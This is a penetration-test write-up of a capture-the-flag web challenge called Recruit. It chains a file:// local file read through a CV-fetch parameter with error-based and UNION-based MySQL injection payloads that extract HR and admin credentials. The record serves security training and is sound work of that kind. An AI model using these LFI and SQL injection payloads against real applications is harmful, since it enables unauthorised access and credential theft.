# Pentest Report — Recruit Web Challenge

## 1. Summary

- **Target:** 10.48.160.123 (Recruit web challenge)
- **Category:** Web exploitation
- **Status:** Complete
- **Outcome:** Both flags captured. Chained an LFI (`file.php?cv=`) to obtain HR credentials, then a SQL injection in candidate search to extract admin credentials from the database, achieving full admin access to the application.

## 2. Scope & Environment

| Item | Value |
|---|---|
| Target IP | 10.48.160.123 |
| Hostname/title | |
| Date started | 2026-09-05 |

## 3. Methodology / Timeline

Chronological log of actions taken, in order. Filled in as the engagement progresses.

### 2026-09-05 — Endpoint discovery: file.php SSRF/LFI candidate

- Browsed `http://10.48.160.123/api.php` — page contains a hint pointing to another endpoint.
- Hint reveals: `file.php` accepts a `cv` parameter that fetches a candidate CV from a URL:
  ```
  /file.php?cv=<URL>
  ```
- This is a candidate **SSRF** (fetches attacker-supplied URL server-side) and possibly **LFI** if it also accepts local paths or `file://` scheme. Needs testing before confirming as a finding.

### 2026-09-05 — Directory enumeration

- Ran:
  ```
  gobuster dir -u 10.48.160.123 -w ../../../Security_Access/wordlists/dirbuster/directory-list-2.3-medium.txt
  ```
- Results:
  ```
  mail                 (Status: 301) [Size: 313] [--> http://10.48.160.123/mail/]
  assets               (Status: 301) [Size: 315] [--> http://10.48.160.123/assets/]
  javascript           (Status: 301) [Size: 319] [--> http://10.48.160.123/javascript/]
  ```
- `mail/` is the most promising lead — possibly a webmail app or internal service reachable via the `file.php?cv=` SSRF. `assets/` and `javascript/` likely static content, lower priority.

### 2026-09-05 — mail/ directory listing exposed

- Browsed `http://10.48.160.123/mail/` — Apache directory listing is enabled (no index page), exposing:
  ```
  mail.log   2025-12-18 08:28   1.6K
  ```
- Directory listing being enabled at all is a minor info-disclosure issue. Contents of `mail.log` pending review — likely to contain internal hostnames, mail routing, or credentials.

- Fetched `http://10.48.160.123/mail/mail.log` — contents:
  ```
  As discussed during deployment:
  - HR login credentials (username: hr) are currently stored in the application
    configuration file (config.php) for ease of access during
    the initial rollout phase.
  - Administrator credentials are NOT stored in the application
    files and are securely maintained within the backend database.
  ```
- **Key intel:** `hr` username confirmed, password lives in `config.php`. Admin creds are DB-only (not in this file) — out of scope for this path.
- **Next step:** use the `file.php?cv=<URL>` SSRF/LFI to read `config.php` and extract the `hr` password (e.g. try `file://` wrapper, `php://filter/convert.base64-encode/resource=config.php`, or a relative/local path depending on what the endpoint accepts).

### 2026-09-05 — Confirmed SSRF/LFI, extracted HR credentials

- Request:
  ```
  GET http://10.48.160.123/file.php?cv=file:///var/www/html/config.php
  ```
- `file.php` accepts the `file://` wrapper and returns the raw source of `config.php` (server-side file read, not just SSRF over HTTP — this is a full **Local File Inclusion / arbitrary file read**).
- Response revealed:
  ```php
  $APP_NAME        = 'Recruit';
  $APP_ENV         = 'production';
  $APP_VERSION     = '1.2.4';
  $APP_DEBUG       = false;

  $HR_PASSWORD = 'hrpassword123';

  $API_ENABLED     = true;
  $API_VERSION     = 'v1';
  ```
- **Credentials obtained:** `hr` / `hrpassword123`

### 2026-09-05 — Logged in as hr, captured first flag

- Logged into the Recruit app with `hr` / `hrpassword123`.
- Landed on "Candidate Applications" page — flag box shown directly:
  ```
  THM{LOGGED_IN_USER}
  ```
- Page features observed for further testing:
  - "Search candidate name" input + Search button — candidate for SQLi (relevant since admin creds are DB-stored per `mail.log`, not file-based).
  - Candidate table (ID, Name, Position, Status) — 4 rows shown (Alice Johnson, Bob Smith, Charlie Brown, Diana Prince).
  - "Access API" link at bottom — not yet followed.
- **Next goal:** escalate to admin login (admin creds confirmed to live in the backend database, not in app files) — start with the search box for SQLi, then check "Access API".

### 2026-09-05 — SQL injection confirmed in candidate search

- Input tested: `' OR 1=1;--` in the "Search candidate name" field.
- Response:
  ```
  SQL Error:
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 1
  ```
- **Confirmed: error-based SQL injection (MySQL backend)** in the candidate search parameter.
- Error hints the query is a `LIKE '%<input>%'` pattern — the trailing `%'` after the injected `--` comment isn't being consumed, which is why syntax still breaks. Next attempt should account for the trailing `%'`, e.g. `' OR 1=1 -- -` or closing the LIKE clause explicitly (`' OR '1'='1`).
- This is a strong candidate for extracting admin credentials from the backend database (per `mail.log`, admin creds live in the DB, not in files) via UNION-based or boolean/error-based extraction.
- **Root cause of the syntax error identified:** MySQL's `--` comment requires a trailing whitespace/control character to be recognized as a comment at all. The payload `' OR 1=1;--` had nothing after `--`, so MySQL did not treat it as a comment and instead choked on the literal trailing `%'` appended by the app's `LIKE '%<input>%'` wrapping. Revised payloads to try: `' OR 1=1-- ` (trailing space) or `' OR 1=1#` (MySQL `#` comment doesn't require trailing space).

- **Working payload confirmed:**
  ```
  %' OR 1=1-- -
  ```
  Leading `%` matches the wrapper's opening `%`, `OR 1=1` makes the WHERE clause always true, `-- -` comments out the trailing `%'`. Result: search returns **all** candidates regardless of input — full authentication/filter bypass on this query.
- **F2 status: fully confirmed** (error-based trigger + working boolean bypass). Next: attempt UNION-based extraction to pull admin credentials from the backend database (need to determine column count first, e.g. `%' ORDER BY N-- -` or `%' UNION SELECT ...-- -`).

## 4. Findings

_(One entry per vulnerability/technique. Filled in as discovered.)_

### F1 — Local File Inclusion / Arbitrary File Read via `file.php?cv=` (CONFIRMED)

- **Description:** The `file.php` endpoint (disclosed via a FAQ hint on `api.php`: "How can I fetch a candidate CV using the API?") accepts a `cv` parameter intended to fetch a candidate's CV from a URL. It does not restrict the URL scheme, so passing a `file://` URI causes the server to read and return arbitrary local files instead of fetching remote content. This is a Local File Inclusion (LFI) / arbitrary file read, reachable through what was advertised as a CV-fetch feature.
- **Evidence:**
  ```
  GET http://10.48.160.123/file.php?cv=file:///var/www/html/config.php
  ```
  Response returned the full source of `config.php`, including:
  ```php
  $HR_PASSWORD = 'hrpassword123';
  ```
- **Impact:** Full read access to server-side application files. Directly exposed hardcoded credentials (`hr` / `hrpassword123`) that were stored in application config instead of the database, per the note in `mail.log`. Depending on what else is readable on the filesystem (`/etc/passwd`, other app configs, SSH keys, etc.), impact could extend further.
- **How found:** `api.php` FAQ contained a hint pointing to `file.php?cv=<URL>`. Directory brute-force (`gobuster`) uncovered `/mail/` with directory listing enabled, exposing `mail.log`, which stated HR credentials were stored in `config.php`. Combined the two: used the `cv` parameter with a `file://` wrapper to read `config.php` directly and retrieve the password.
- **Related:** `api.php` also has an "Access API" link — not yet followed/tested.

### F2 — SQL Injection in Candidate Search (CONFIRMED)

- **Description:** The "Search candidate name" field on the Candidate Applications page is vulnerable to SQL injection. Input is inserted directly into a `LIKE '%<input>%'` clause without sanitization, allowing both error-based injection and boolean-based filter bypass.
- **Evidence:**
  - Error trigger: `' OR 1=1;--` → `SQL Error: ... near '--%'' at line 1` (confirms unsanitized input reaches the query; also reveals MySQL backend and the `LIKE '%...%'` wrapping).
  - Working bypass: `%' OR 1=1-- -` → returns all 4 candidates regardless of actual name match.
- **Impact:** Full database read access via UNION-based extraction. Confirmed database name (`recruit_db`), table names (`candidates`, `users`), `users` table schema (`id`, `username`, `password`), and extracted admin credentials (`admin` / `admin@001admin`) directly from the database.
- **How found:** Tested search field with classic SQLi probe (`'`) after identifying admin creds are DB-only; error message confirmed injection and leaked query structure detail (`LIKE` wrapping). Escalated to UNION-based extraction to enumerate schema and pull credentials.

### 2026-09-05 — UNION-based extraction, determining column count

- Tested: `%' UNION SELECT 1-- -`
- Response: `SQL Error: The used SELECT statements have a different number of columns`
- Confirms UNION injection is reachable; single-column guess was wrong. Visible table has 4 columns (ID, Name, Position, Status), so likely needs 4 — testing `%' UNION SELECT 1,2,3,4-- -` next.
- Tested: `%' UNION SELECT 1,2,3,4-- -`
- Response: no error — extra row appended to table: `1 | 2 | 3 | 4`
- **Column count confirmed: 4.** UNION injection fully working; columns 2 and 3 (Name, Position) render as visible text on the page.

- Tested: `%' UNION SELECT 1,2,3,database()-- -`
- Response: extra row `1 | 2 | 3 | recruit_db`
- **Current database identified: `recruit_db`**

- Tested: `%' UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema = "recruit_db"-- -`
- Response: extra row `1 | 2 | 3 | candidates,users`
- **Tables identified: `candidates`, `users`.** `candidates` already accessible via the app UI; `users` is the target for admin credentials.

- Tested: `%' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = "users"-- -`
- Response: extra row's Status column contains:
  ```
  USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,id,username,password
  ```
  (first five are MySQL `information_schema.columns` session/connection metadata noise, not actual `users` table columns)
- **Relevant `users` table columns identified: `id`, `username`, `password`.** Next target: extract `username`/`password` values from `users`.

- Tested: `%' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users-- -`
- Response: extra row's Status column contains:
  ```
  admin:admin@001admin
  ```
- **Admin credentials extracted via SQLi:** `admin` / `admin@001admin`

### 2026-09-05 — Logged in as admin, captured second flag

- Logged into the Recruit app with `admin` / `admin@001admin`.
- Landed on "Candidate Applications" page with elevated privileges — "ADMIN Flag" box shown, plus new "Action" column (Approve/Reject) not present for the `hr` role.
- Flag:
  ```
  THM{LOGGED_IN_ADM1N1}
  ```

## 5. Exploitation Chain

1. Discovered `file.php?cv=<URL>` endpoint via a hint on `api.php`.
2. Directory brute-force (`gobuster`) found `/mail/` with directory listing enabled, exposing `mail.log`.
3. `mail.log` revealed HR credentials are stored in `config.php` (username: `hr`), while admin credentials live only in the database.
4. Exploited `file.php?cv=file:///var/www/html/config.php` (LFI via `file://` wrapper) to read `config.php` and obtain `hr` / `hrpassword123` (**F1**).
5. Logged in as `hr` → captured Flag 1 (`THM{LOGGED_IN_USER}`).
6. Found SQL injection in the "Search candidate name" field (**F2**), confirmed via error message and a working `%' OR 1=1-- -` bypass.
7. Used UNION-based injection to enumerate: current database (`recruit_db`) → tables (`candidates`, `users`) → `users` columns (`id`, `username`, `password`) → extracted `admin` / `admin@001admin`.
8. Logged in as `admin` → captured Flag 2 (`THM{LOGGED_IN_ADM1N1}`) and gained access to Approve/Reject actions on candidates.

## 6. Flag & Proof

- **Flag 1 (logged-in user):** `THM{LOGGED_IN_USER}`
- **Proof:** Displayed in the "HR Flag" box on the Candidate Applications page after logging in as `hr` / `hrpassword123` (see F1 for how these credentials were obtained).
- **Flag 2 (admin access):** `THM{LOGGED_IN_ADM1N1}`
- **Proof:** Displayed in the "ADMIN Flag" box on the Candidate Applications page after logging in as `admin` / `admin@001admin` (see F2 for how these credentials were obtained via SQL injection).

## 7. Remediation

_(Optional — fill in if the challenge expects defensive recommendations.)_

## 8. Appendix

_(Raw command output, scripts, screenshots referenced from findings.)_
